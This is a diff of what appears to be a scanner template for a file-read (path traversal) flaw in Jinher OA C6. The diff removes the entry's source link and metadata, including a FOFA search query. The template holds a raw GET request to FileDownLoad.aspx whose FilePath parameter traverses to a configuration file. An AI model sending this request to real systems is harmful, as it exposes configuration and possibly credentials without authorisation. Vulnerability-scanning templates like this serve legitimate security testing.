@@ -3,12 +3,8 @@ info:
   name: 金和OA-C6-文件读取-FileDownLoad
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mtwgctgrkcdsiv1t'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mtwgctgrkcdsiv1t
-    fofa: body="JHSoft.Web.AddMenu"
 http:
 - raw:
   - 'GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
